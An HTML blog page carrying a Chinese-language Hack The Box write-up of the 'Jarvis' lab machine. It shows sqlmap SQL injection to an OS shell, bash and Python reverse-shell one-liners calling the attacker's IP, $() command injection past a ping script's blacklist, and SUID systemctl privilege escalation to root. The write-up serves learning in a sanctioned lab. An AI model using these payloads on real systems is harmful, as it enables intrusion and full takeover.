@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="sudoers,suid,sql注入,OS命令执行,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介sql注入获取webshell，sudoers搭配操作系统命令执行获取pepper reverse shell，suid创建systemd服务提权。 靶机状态: rooted.">
+<meta name="keywords" content="sudoers,suid,sql注入,OS命令执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB linux Jarvis">
+<meta property="og:url" content="https://exexute.github.io/2019/08/12/HTB-linux-Jarvis/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="简介sql注入获取webshell，sudoers搭配操作系统命令执行获取pepper reverse shell，suid创建systemd服务提权。 靶机状态: rooted.">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://exexute.github.io/2019/08/12/HTB-linux-Jarvis/Jarvis_mind.png">
+<meta property="og:updated_time" content="2022-06-24T14:37:08.024Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB linux Jarvis">
+<meta name="twitter:description" content="简介sql注入获取webshell，sudoers搭配操作系统命令执行获取pepper reverse shell，suid创建systemd服务提权。 靶机状态: rooted.">
+<meta name="twitter:image" content="https://exexute.github.io/2019/08/12/HTB-linux-Jarvis/Jarvis_mind.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2019/08/12/HTB-linux-Jarvis/">
+
+
+
+
+
+  <title>HTB linux Jarvis | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2019/08/12/HTB-linux-Jarvis/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HTB linux Jarvis</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-12T14:02:33+08:00">
+                2019-08-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简介<br>sql注入获取webshell，sudoers搭配操作系统命令执行获取pepper reverse shell，suid创建systemd服务提权。</p>
+<p>靶机状态: rooted.</p>
+<p><img src="./Jarvis_mind.png" alt="简介"><br><a id="more"></a></p>
+<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
+<li>nmap &amp;&amp; sqlmap</li>
+<li>LinEnum &amp;&amp; 命令执行</li>
+<li>suid &amp;&amp; systemd</li>
+</ul>
+<blockquote>
+<p>nmap &amp;&amp; sqlmap</p>
+</blockquote>
+<p>端口扫面发现22端口OpenSSH 7.4p1，80端口Apache httpd 2.4.25；WEB中间件不存在cve, 直接扫目录，看是否存在敏感信息，同时开始配置host, 查看WEB页面。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sC -sV -oA Javris/nmap/Jarvis 10.10.10.143</span><br><span class="line"><span class="comment"># Nmap 7.70 scan initiated Tue Jul  9 22:02:25 2019 as: nmap -sC -sV -oA Jarvis/nmap/Jarvis 10.10.10.143</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.143</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)</span><br><span class="line">|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)</span><br><span class="line">|_  256 77:d4:ae:1f:b0:be:15:1f:f8:<span class="built_in">cd</span>:c8:15:3a:c3:69:e1 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_http-title: Stark Hotel</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Tue Jul  9 22:26:03 2019 -- 1 IP address (1 host up) scanned in 1418.35 seconds</span></span><br></pre></td></tr></table></figure></p>
+<p>然后在 <a href="http://10.10.10.143/room.php?cod=2" target="_blank" rel="noopener">http://10.10.10.143/room.php?cod=2</a> 页面发现sql注入，sqlmap上去跑库、表、用户、读flag、获取os-shell，最后发现获取os-shell是正解。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload: cod=8 AND (SELECT 7865 FROM (SELECT(SLEEP(5)))SzuN)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看主机名</span></span><br><span class="line">$ sqlmap -u http://10.10.10.143/room.php\?cod\=2 -v3 --hostname --batch</span><br><span class="line">jarvis</span><br><span class="line"></span><br><span class="line">$ sqlmap -u http://10.10.10.143/room.php\?cod\=2 -v3 --os-shell --batch</span><br><span class="line">os-shell&gt; /bin/bash -i &gt;&amp; /dev/tcp/10.10.15.234/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
+<p>进入webshell之后收集信息，发现php配置文件, 尝试用配置中的用户密码登陆ssh，无果。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$connection=<span class="keyword">new</span> mysqli(<span class="string">'127.0.0.1'</span>,<span class="string">'DBadmin'</span>,<span class="string">'imissyou'</span>,<span class="string">'hotel'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>LinEnum &amp;&amp; 命令执行</p>
+</blockquote>
+<p><strong>www-data</strong> 信息收集未发现有用内容，运行LinEnum.sh收集信息发现www-data用户的sudoers配置<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:/var/www/Admin-Utilities$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on jarvis:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on jarvis:</span><br><span class="line">    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py</span><br></pre></td></tr></table></figure></p>
+<p>查看”/var/www/Admin-Utilities/simpler.py”源码, 关键代码如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_ping</span><span class="params">()</span>:</span></span><br><span class="line">    forbidden = [<span class="string">'&amp;'</span>, <span class="string">';'</span>, <span class="string">'-'</span>, <span class="string">'`'</span>, <span class="string">'||'</span>, <span class="string">'|'</span>]</span><br><span class="line">    command = input(<span class="string">'Enter an IP: '</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> forbidden:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            print(<span class="string">'Got you'</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">'ping '</span> + command)</span><br></pre></td></tr></table></figure></p>
+<p>exec_ping中处理命令执行时，忽略了对$符号的检测，因此利用$()可以读取user.txt和获取反弹shell<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</span><br><span class="line">&lt;<span class="keyword">do</span> -u pepper /var/www/Admin-Utilities/simpler.py -p</span><br><span class="line">***********************************************</span><br><span class="line">     _                 _</span><br><span class="line"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _</span><br><span class="line">/ __| | <span class="string">'_ ` _ \| '</span>_ \| |/ _ \ <span class="string">'__| '</span>_ \| | | |</span><br><span class="line">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span><br><span class="line">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span><br><span class="line">                |_|               |_|    |___/</span><br><span class="line">                                @ironhackers.es</span><br><span class="line"></span><br><span class="line">***********************************************</span><br><span class="line"></span><br><span class="line">Enter an IP: $(cat /home/pepper/user.txt)</span><br><span class="line">ping: 2afa36c4f05b37b34259c93551f5c44f: Temporary failure <span class="keyword">in</span> name resolution</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编写反弹shell</span></span><br><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.187",4447));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行反弹shell</span></span><br><span class="line">www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</span><br><span class="line">sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</span><br><span class="line">***********************************************</span><br><span class="line">     _                 _</span><br><span class="line"> ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _</span><br><span class="line">/ __| | <span class="string">'_ ` _ \| '</span>_ \| |/ _ \ <span class="string">'__| '</span>_ \| | | |</span><br><span class="line">\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |</span><br><span class="line">|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |</span><br><span class="line">                |_|               |_|    |___/</span><br><span class="line">                                @ironhackers.es</span><br><span class="line"></span><br><span class="line">***********************************************</span><br><span class="line"></span><br><span class="line">Enter an IP: $(/bin/bash /tmp/owef.sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击机器运行nc监听端口，获取反弹shell</span></span><br><span class="line">nc -lv 4447</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (599): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">pepper@jarvis:/tmp$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>suid &amp;&amp; systemd</p>
+</blockquote>
+<p>获取到pepper的shell后，运行LinEnum.sh收集信息，发现/bin/systemctl被设置了suid，在<a href="https://gtfobins.github.io/gtfobins/systemctl/" target="_blank" rel="noopener">GTFObins</a>中查看利用方法<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="string">'cp $(which systemctl) .; chmod +s ./systemctl'</span></span><br><span class="line"></span><br><span class="line">TF=$(mktemp).service</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'[Service]</span></span><br><span class="line"><span class="string">Type=oneshot</span></span><br><span class="line"><span class="string">ExecStart=/bin/sh -c "id &gt; /tmp/output"</span></span><br><span class="line"><span class="string">[Install]</span></span><br><span class="line"><span class="string">WantedBy=multi-user.target'</span> &gt; <span class="variable">$TF</span></span><br><span class="line">./systemctl link <span class="variable">$TF</span></span><br><span class="line">./systemctl <span class="built_in">enable</span> --now <span class="variable">$TF</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>pepper</strong> 因此编写自己的提权服务，通过systemctl运行安装、运行提权服务获取root权限<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行编写owef.service</span></span><br><span class="line">[Unit]</span><br><span class="line">Description=Authentication service <span class="keyword">for</span> virtual machines hosted on VMware</span><br><span class="line">Documentation=http://github.com/vmware/open-vm-tools</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/bin/bash /home/pepper/owef.sh</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用systemctl创建服务</span></span><br><span class="line">$ /bin/systemctl link /home/pepper/owef.service</span><br><span class="line">$ /bin/systemctl <span class="built_in">enable</span> --now owef.service</span><br><span class="line"></span><br><span class="line">$ nc -lv 4448</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (11105): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@jarvis:/<span class="comment"># cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">bash: <span class="built_in">cd</span>: HOME not <span class="built_in">set</span></span><br><span class="line">root@jarvis:/<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@jarvis:/root<span class="comment"># cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line">d41d8cd98f00b204e9800998ecf84271</span><br><span class="line">root@jarvis:/root<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sudoers/" rel="tag"># sudoers</a>
+          
+            <a href="/tags/suid/" rel="tag"># suid</a>
+          
+            <a href="/tags/sql注入/" rel="tag"># sql注入</a>
+          
+            <a href="/tags/OS命令执行/" rel="tag"># OS命令执行</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/31/HTB-linux-LuKe/" rel="next" title="HTB linux LuKe">
+                <i class="fa fa-chevron-left"></i> HTB linux LuKe
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/13/NoSql-Injection-Patrick-Spiegel/" rel="prev" title="NoSql Injection - Patrick Spiegel(翻译)">
+                NoSql Injection - Patrick Spiegel(翻译) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文章目录"><span class="nav-number">1.</span> <span class="nav-text">文章目录</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
